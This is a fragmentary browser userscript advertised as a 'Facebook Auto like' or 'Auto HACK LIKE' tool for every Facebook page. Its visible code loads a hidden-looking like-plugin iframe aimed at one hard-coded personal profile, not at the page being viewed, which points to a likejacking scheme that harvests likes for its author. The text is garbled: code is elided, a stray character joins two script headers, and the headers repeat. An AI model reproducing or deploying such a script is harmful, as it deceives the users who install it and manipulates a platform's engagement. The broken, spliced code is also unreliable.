// ==UserScript==
// @name            FAcebook Auto like *UPDATED 2013*
// @description     FAcebook Auto like by Fb status only
...
(function(){
  ...
  lbox.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'https://www.facebook.com/farhan.bukhari.3956') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
  lbox.scrolling = 'no';
  lbox.frameBorder = 0;
...
?// ==UserScript==
// @name            FAcebook Auto HACK LIKE *UPDATED 2013*
// @description     FAcebook Auto HACK LIKE 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
